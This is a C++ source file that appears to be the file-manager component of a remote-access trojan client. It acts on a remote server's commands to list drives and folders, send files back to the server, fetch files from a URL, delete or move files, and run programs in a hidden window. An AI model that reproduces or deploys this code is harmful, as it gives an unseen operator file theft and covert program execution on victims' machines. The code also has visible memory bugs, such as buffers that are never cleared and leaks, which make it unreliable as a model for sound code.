#include "FileManager.h"
#include <stdio.h>
#include "MiniFileTrans.h"
#include "MiniDownload.h"


CFileManager::CFileManager(DWORD dwIdentity) :
CEventHandler(dwIdentity)
{
	//init buffer.
	m_pCurDir = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_SrcPath = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_FileList = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_bMove = FALSE;
}


CFileManager::~CFileManager()
{
	if (m_pCurDir)
		free(m_pCurDir);
}

void CFileManager::OnClose()
{

}
void CFileManager::OnConnect()
{

}

void CFileManager::OnReadPartial(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{

}
void CFileManager::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch (Event)
	{
	case FILE_MGR_CHDIR:
		OnChangeDir(Buffer);
		break;
	case FILE_MGR_GETLIST:
		OnGetCurList();
		break;
	case FILE_MGR_UP:
		OnUp();
		break;
	case FILE_MGR_SEARCH:
		OnSearch();
		break;
	case FILE_MGR_UPLOADFROMDISK:
		OnUploadFromDisk(Buffer);
		break;
	case FILE_MGR_UPLOADFRURL:
		OnUploadFromUrl(Buffer);
		break;
	case FILE_MGR_DOWNLOAD:
		OnDownload(Buffer);
		break;
	case FILE_MGR_RUNFILE_HIDE:
	case FILE_MGR_RUNFILE_NORMAL:
		OnRunFile(Event,Buffer);
		break;
	case FILE_MGR_REFRESH:
		OnRefresh();
		break;
	case FILE_MGR_NEWFOLDER:
		OnNewFolder(Buffer);
		break;
	case FILE_MGR_RENAME:
		OnRename(Buffer);
		break;
	case FILE_MGR_DELETE:
		OnDelete(Buffer);
		break;
	case FILE_MGR_COPY:
		OnCopy(Buffer);
		break;
	case FILE_MGR_CUT:
		OnCut(Buffer);
		break;
	case FILE_MGR_PASTE:
		OnPaste(Buffer);
		break;
	//echo
	case FILE_MGR_PREV_DOWNLOAD:
		Send(FILE_MGR_PREV_DOWNLOAD, 0, 0);
		break;
	case FILE_MGR_PREV_UPLOADFROMDISK:
		Send(FILE_MGR_PREV_UPLOADFROMDISK, 0, 0);
		break;
	case FILE_MGR_PREV_UPLOADFRURL:
		Send(FILE_MGR_PREV_UPLOADFRURL, 0, 0);
		break;
	case FILE_MGR_PREV_NEWFOLDER:
		Send(FILE_MGR_PREV_NEWFOLDER, 0, 0);
		break;
	case FILE_MGR_PREV_RENAME:
		Send(FILE_MGR_PREV_RENAME, 0, 0);
		break;
	}
}

void CFileManager::RunModule(ModuleContext*pContext)
{
	if(!pContext)
		return;
	if(!pContext->m_pEntry)
		goto Failed;
	pContext->m_pEntry(pContext->szServerAddr,pContext->uPort,pContext->m_dwParam);

Failed:
	if(pContext->m_dwParam)
		free((void*)pContext->m_dwParam);
}

void CFileManager::OnUp()
{
	WCHAR*pNewDir = (WCHAR*)malloc(sizeof(WCHAR) *(wcslen(m_pCurDir) + 1));
	wcscpy(pNewDir, m_pCurDir);

	int PathLen = wcslen(pNewDir);
	if (PathLen)
	{
		if (PathLen > 3)
		{
			WCHAR*p = pNewDir + wcslen(pNewDir) - 1;
			while (p >= pNewDir && p[0] != '\\' && p[0] != '/')
				p--;
			p[0] = 0;
		}
		else
			pNewDir[0] = 0;
	}
	OnChangeDir((char*)pNewDir);
	free(pNewDir);
}
//修改目录,服务器应该在成功之后再请求List.;

void CFileManager::OnChangeDir(char*Buffer)
{
	//一个字节statu + CurLocation + List.;
	WCHAR*pNewDir = (WCHAR*)Buffer;
	BOOL bStatu = ChDir(pNewDir);
	DWORD dwBufLen = 0;
	dwBufLen += 1;
	dwBufLen += sizeof(WCHAR) *(wcslen(m_pCurDir) + 1);
	char*Buff = (char*)malloc(dwBufLen);
	Buff[0] = bStatu;
	wcscpy((WCHAR*)&Buff[1], m_pCurDir);
	Send(FILE_MGR_CHDIR_RET, Buff, dwBufLen);
	free(Buff);
}

void CFileManager::OnGetCurList()
{
	if (!wcslen(m_pCurDir))
	{
		SendDriverList();
	}
	else
	{
		SendFileList();
	}
}

typedef struct DriverInfo
{
	WCHAR szName[128];
	WCHAR szTypeName[128];
	WCHAR szFileSystem[128];
	ULARGE_INTEGER	Total;
	ULARGE_INTEGER	Free;
	DWORD dwType;
}DriverInfo;

WCHAR* MemUnits[] =
{
	L"Byte",
	L"KB",
	L"MB",
	L"GB",
	L"TB"
};

void CFileManager::SendDriverList()
{
	DriverInfo	dis[26] = { 0 };				//最多26
	DWORD		dwUsed = 0;
	DWORD dwDrivers = GetLogicalDrives();
	WCHAR szRoot[] = { 'A',':','\\',0 };
	while (dwDrivers)
	{
		if (dwDrivers & 1)
		{
			DriverInfo*pDi = &dis[dwUsed++];
			pDi->szName[0] = szRoot[0];

			GetVolumeInformation(szRoot, 0, 0, 0, 0, 0, pDi->szFileSystem, 128);

			SHFILEINFO si = { 0 };
			SHGetFileInfo(szRoot, FILE_ATTRIBUTE_NORMAL, &si, sizeof(si), SHGFI_USEFILEATTRIBUTES | SHGFI_DISPLAYNAME | SHGFI_TYPENAME);
			wcscpy(&pDi->szName[1], si.szDisplayName);
			wcscpy(pDi->szTypeName, si.szTypeName);

			GetDiskFreeSpaceEx(szRoot, 0, &pDi->Total, &pDi->Free);

			pDi->dwType = GetDriveType(szRoot);
		}
		dwDrivers >>= 1;
		szRoot[0]++;
	}
	//发送回复.
	Send(FILE_MGR_GETLIST_RET, (char*)&dis, sizeof(DriverInfo) * dwUsed);
}

typedef struct FmFileInfo
{
	DWORD dwFileAttribute;
	DWORD dwFileSizeLo;
	DWORD dwFileSizeHi;
	DWORD dwLastWriteLo;
	DWORD dwLastWriteHi;
	WCHAR szFileName[2];
}FmFileInfo;

void CFileManager::SendFileList()
{
	WCHAR *StartDir = (WCHAR*)malloc((wcslen(m_pCurDir) + 3) * sizeof(WCHAR));
	wcscpy(StartDir, m_pCurDir);
	wcscat(StartDir, L"\\*");

	DWORD	dwCurBuffSize = 0x10000;		//64kb
	char*	FileList = (char*)malloc(dwCurBuffSize);
	DWORD	dwUsed = 0;

	WIN32_FIND_DATA fd = { 0 };
	HANDLE hFirst = FindFirstFile(StartDir, &fd);
	BOOL bNext = TRUE;
	while (hFirst != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L".."))
			)
		{
			if ((dwCurBuffSize - dwUsed) < (sizeof(FmFileInfo) + sizeof(WCHAR) * wcslen(fd.cFileName)))
			{
				dwCurBuffSize *= 2;
				FileList = (char*)realloc(FileList, dwCurBuffSize);
			}

			FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
			pFmFileInfo->dwFileAttribute = fd.dwFileAttributes;
			pFmFileInfo->dwFileSizeHi = fd.nFileSizeHigh;
			pFmFileInfo->dwFileSizeLo = fd.nFileSizeLow;

			memcpy(&pFmFileInfo->dwLastWriteLo, &fd.ftLastWriteTime, sizeof(FILETIME));

			wcscpy(pFmFileInfo->szFileName, fd.cFileName);

			dwUsed += (((char*)(pFmFileInfo->szFileName) - (char*)pFmFileInfo) + sizeof(WCHAR)* (wcslen(fd.cFileName) + 1));
		}

		bNext = FindNextFile(hFirst, &fd);
	}

	FindClose(hFirst);
	free(StartDir);
	//最后添加一个空项作为结尾.;
	if ((dwCurBuffSize - dwUsed) < sizeof(FmFileInfo))
	{
		dwCurBuffSize *= 2;
		FileList = (char*)realloc(FileList, dwCurBuffSize);
	}
	FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
	memset(pFmFileInfo, 0, sizeof(FmFileInfo));
	dwUsed += sizeof(FmFileInfo);

	//发送回复.;
	Send(FILE_MGR_GETLIST_RET, FileList, dwUsed);
	free(FileList);
}

BOOL CFileManager::ChDir(const WCHAR* Dir)
{
	BOOL bResult = FALSE;
	BOOL bIsDrive = FALSE;
	//根目录;
	if (Dir[0] == 0)
	{
		memset(m_pCurDir, 0, 0x10000);
		return TRUE;
	}
	//
	WCHAR	*pTemp = (WCHAR*)malloc(sizeof(WCHAR) * (wcslen(Dir) + 3));
	wcscpy(pTemp, Dir);

	if ((Dir[0] <'A' || Dir[0]>'Z') &&
		(Dir[0] <'a' || Dir[0]>'z'))
		return FALSE;
	if (Dir[1] != ':' && (Dir[2] != 0 && Dir[2] != '\\' && Dir[2] != '/'))
		return FALSE;
	//加上\\*
	wcscat(pTemp, L"\\*");
	const WCHAR*pIt = &pTemp[3];
	WCHAR*pNew = &pTemp[2];
	while (pNew[0])
	{
		*pNew++ = '\\';
		//跳过\\,/
		while(pIt[0] && (pIt[0] == '/' || pIt[0] == '\\'))
			pIt++;
		//找到文件名
		while (pIt[0] && (pIt[0] != '/' && pIt[0] != '\\'))
			*pNew++ = *pIt++;
		//到了文件名之后,可能是'\\' '/'或者空.
		*pNew = *pIt++;
	}
	//盘符
	WIN32_FIND_DATA fd = { 0 };
	//看一下这个文件夹是否可以访问.
	HANDLE hFile = FindFirstFile(pTemp, &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		bResult = TRUE;
		wcscpy(m_pCurDir, pTemp);

		//去掉*
		m_pCurDir[wcslen(m_pCurDir) - 1] = 0;

		if (wcslen(m_pCurDir)>3)
			m_pCurDir[wcslen(m_pCurDir) - 1] = 0;	//非根目录,去掉最后的
	}

	if (hFile != INVALID_HANDLE_VALUE)
		FindClose(hFile);		
	
	free(pTemp);
	return bResult;
}

/**************************************************************/
void BeginFileTrans(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginDownload(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginSearch(char* szServerAddr,unsigned short uPort,DWORD dwParam);
/**************************************************************/

void CFileManager::OnUploadFromUrl(char*Buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//获取服务器
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginDownload;

	WCHAR*pInit = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen((WCHAR*)Buffer) + 1));
	wcscpy(pInit, m_pCurDir);
	wcscat(pInit, L"\n");
	wcscat(pInit, (WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_dwParam = (DWORD)pInit;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}
void CFileManager::OnUploadFromDisk(char*Buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//获取服务器
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginFileTrans;

	CMiniFileTransInit*pInit = (CMiniFileTransInit*)malloc(sizeof(DWORD) + sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen((WCHAR*)Buffer) + 1));
	pInit->m_dwDuty = MNFT_DUTY_RECEIVER;
	wcscpy(pInit->m_Buffer,m_pCurDir);
	wcscat(pInit->m_Buffer, L"\n");
	wcscat(pInit->m_Buffer, (WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_dwParam= (DWORD)pInit;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}

void CFileManager::OnDownload(char*buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//获取服务器
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginFileTrans;

	CMiniFileTransInit*pInit = (CMiniFileTransInit*)malloc(sizeof(DWORD) + sizeof(WCHAR)*(wcslen((WCHAR*)buffer) + 1));
	pInit->m_dwDuty = MNFT_DUTY_SENDER;
	wcscpy(pInit->m_Buffer, (WCHAR*)buffer);
	//Get Init Data.
	pContext->m_dwParam = (DWORD)pInit;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}

void CFileManager::OnRunFile(DWORD Event,char*buffer)
{
	DWORD dwShow = SW_SHOWNORMAL;
	if (Event == FILE_MGR_RUNFILE_HIDE)
		dwShow = SW_HIDE;

	WCHAR*pIt = (WCHAR*)buffer;
	while (pIt[0])
	{
		//跳过\n;
		while (pIt[0] && pIt[0] == '\n') 
			pIt++;
		if (pIt[0])
		{
			WCHAR*pFileName = pIt;
			//找到结尾.;
			while (pIt[0] && pIt[0] != '\n') pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//
			WCHAR*pFile = (WCHAR*)malloc((wcslen(m_pCurDir)+ 1 + wcslen(pFileName) + 1) * sizeof(WCHAR));
			wcscpy(pFile, m_pCurDir);
			wcscat(pFile, L"\\");
			wcscat(pFile, pFileName);

			ShellExecute(NULL, L"open", pFile, NULL, m_pCurDir, dwShow);

			free(pFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnRefresh()
{
	OnChangeDir((char*)m_pCurDir);
}


void CFileManager::OnNewFolder(char*buffer)
{
	if (wcslen(m_pCurDir) == 0)
		return;
	WCHAR *pNewDir = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen((WCHAR*)buffer) + 1));
	wcscpy(pNewDir, m_pCurDir);
	wcscat(pNewDir, L"\\");
	wcscat(pNewDir, (WCHAR*)buffer);
	CreateDirectory(pNewDir,0);
	free(pNewDir);
}
void CFileManager::OnRename(char*buffer)
{
	if (wcslen(m_pCurDir) == 0)
		return;
	WCHAR*pNewName = NULL;

	if ((pNewName = wcsstr((WCHAR*)buffer, L"\n")) == 0)
		return;
	*pNewName++ = 0;

	WCHAR*pOldFile = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen((WCHAR*)buffer) + 1));
	WCHAR*pNewFile = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen(pNewName) + 1));
	wcscpy(pOldFile, m_pCurDir);
	wcscpy(pNewFile, m_pCurDir);

	wcscat(pOldFile, L"\\");
	wcscat(pNewFile, L"\\");

	wcscat(pOldFile, (WCHAR*)buffer);
	wcscat(pNewFile, pNewName);
	MoveFile(pOldFile, pNewFile);

	free(pOldFile);
	free(pNewFile);
}


BOOL MakesureDirExist(const WCHAR* Path, BOOL bIncludeFileName = FALSE);

typedef void(*callback)(WCHAR*szFile, BOOL bIsDir, DWORD dwParam);

static void dfs_BrowseDir(WCHAR*Dir, callback pCallBack,DWORD dwParam)
{
	WCHAR*pStartDir = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(Dir) + 3));
	wcscpy(pStartDir, Dir);
	wcscat(pStartDir, L"\\*");

	WIN32_FIND_DATA fd = { 0 };
	BOOL bNext = TRUE;
	HANDLE hFindFile = FindFirstFile(pStartDir, &fd);
	while (hFindFile != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")))
		{
			WCHAR*szFileName = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(Dir) + 1 + wcslen(fd.cFileName) + 1));
			wcscpy(szFileName, Dir);
			wcscat(szFileName, L"\\");
			wcscat(szFileName, fd.cFileName);

			//目录的话先遍历
			if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				dfs_BrowseDir(szFileName, pCallBack,dwParam);
			}
			pCallBack(szFileName, fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY, dwParam);
			free(szFileName);
		}
		bNext = FindNextFile(hFindFile, &fd);
	}
	if (hFindFile)
		FindClose(hFindFile);
	free(pStartDir);
}

void FMDeleteFile(WCHAR*szFileName, BOOL bIsDir,DWORD dwParam)
{
	if (bIsDir)
	{
		RemoveDirectory(szFileName);
		return;
	}
	DeleteFile(szFileName);
}

void CFileManager::OnDelete(char*buffer)
{
	if (wcslen(m_pCurDir) == 0)
		return;
	//文件名用\n隔开
	WCHAR*pIt = (WCHAR*)buffer;
	WCHAR*pFileName;
	while (pIt[0])
	{
		//跳过\n
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//找到结尾.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//
			WCHAR*szFile = (WCHAR*)malloc(sizeof(WCHAR) * (wcslen(m_pCurDir) + 1 + wcslen(pFileName) + 1));
			wcscpy(szFile, m_pCurDir);
			wcscat(szFile, L"\\");
			wcscat(szFile, pFileName);
			//
			WIN32_FIND_DATA fd;

			HANDLE hFindFile = FindFirstFile(szFile, &fd);
			if (hFindFile != INVALID_HANDLE_VALUE)
			{
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					dfs_BrowseDir(szFile,FMDeleteFile,0);
					RemoveDirectory(szFile);
				}
				else
				{
					DeleteFile(szFile);
				}
				FindClose(hFindFile);
			}
			free(szFile);
			//
			pIt[0] = old;
		}
	}
}

void CFileManager::OnCopy(char*buffer)
{
	WCHAR*p = NULL;
	if ((p = wcsstr((WCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		wcscpy(m_SrcPath, (WCHAR*)buffer);
		wcscpy(m_FileList, p);
		m_bMove = FALSE;
	}
}
	

void CFileManager::OnCut(char*buffer)
{
	WCHAR*p = NULL;
	if ((p = wcsstr((WCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		wcscpy(m_SrcPath, (WCHAR*)buffer);
		wcscpy(m_FileList, p);
		m_bMove = TRUE;
	}
}

void FMCpOrMvFile(WCHAR*szFileName, BOOL bIsDir, DWORD dwParam)
{
	//复制操作目录不用管,该目录下面的所有文件已经复制完了.
	CFileManager*pMgr = (CFileManager*)dwParam;
	WCHAR*pNewFileName = NULL;
	if (bIsDir)
	{
		if (pMgr->m_bMove)
			RemoveDirectory(szFileName);
		return;
	}
	pNewFileName = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(pMgr->m_pCurDir) + 1 + wcslen(szFileName) - wcslen(pMgr->m_SrcPath) + 1));
	//
	wcscpy(pNewFileName, pMgr->m_pCurDir);
	wcscat(pNewFileName, szFileName + wcslen(pMgr->m_SrcPath));
	//确保目录存在
	MakesureDirExist(pNewFileName, 1);
	if (pMgr->m_bMove)
		MoveFile(szFileName, pNewFileName);
	else
		CopyFile(szFileName, pNewFileName,FALSE);
	free(pNewFileName);
}



void CFileManager::OnPaste(char*buffer)
{
	//不允许往驱动器目录复制
	if (wcslen(m_pCurDir) == 0 || wcslen(m_SrcPath) == 0)
		return;
	//都在一个目录下面,不需要复制
	if (wcscmp(m_pCurDir, m_SrcPath) == 0)
		return;

	WCHAR*pIt = m_FileList;
	WCHAR*pFileName;
	while (pIt[0])
	{
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//找到结尾.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//源文件
			WCHAR*szSrcFile = (WCHAR*)malloc(sizeof(WCHAR) * (wcslen(m_SrcPath) + 1 + wcslen(pFileName) + 1));
			wcscpy(szSrcFile, m_SrcPath);
			wcscat(szSrcFile, L"\\");
			wcscat(szSrcFile, pFileName);
			//不允许把目录复制到自己的子目录下面
			DWORD dwSrcLen = wcslen(szSrcFile);
			DWORD dwDestLen = wcslen(m_pCurDir);
			if (dwDestLen >= dwSrcLen && !memcmp(m_pCurDir, szSrcFile, dwSrcLen) && (m_pCurDir[dwSrcLen] == 0 || m_pCurDir[dwSrcLen] == '\\'))
			{
				//C:\asdasf --> C:\asdasf\aaaaa ,不允许这样操作.貌似递归会停不下来
			}
			else
			{
				WIN32_FIND_DATA fd = { 0 };
				HANDLE hFindFile = FindFirstFile(szSrcFile, &fd);
				if (hFindFile != INVALID_HANDLE_VALUE)
				{
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						dfs_BrowseDir(szSrcFile, FMCpOrMvFile, (DWORD)this);
						if (m_bMove)
						{
							RemoveDirectory(szSrcFile);
						}
					}
					else
					{
						//单个文件,复制或移动到当前目录.
						WCHAR*pNewFile = (WCHAR*)malloc(sizeof(WCHAR)*(wcslen(m_pCurDir) + 1 + wcslen(fd.cFileName) + 1));
						wcscpy(pNewFile, m_pCurDir);
						wcscat(pNewFile, L"\\");
						wcscat(pNewFile, fd.cFileName);
						//
						if (m_bMove)
							MoveFile(szSrcFile, pNewFile);
						else
							CopyFile(szSrcFile, pNewFile, FALSE);
						free(pNewFile);
					}
					FindClose(hFindFile);
				}
			}
			free(szSrcFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnSearch()
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//获取服务器
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginSearch;

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}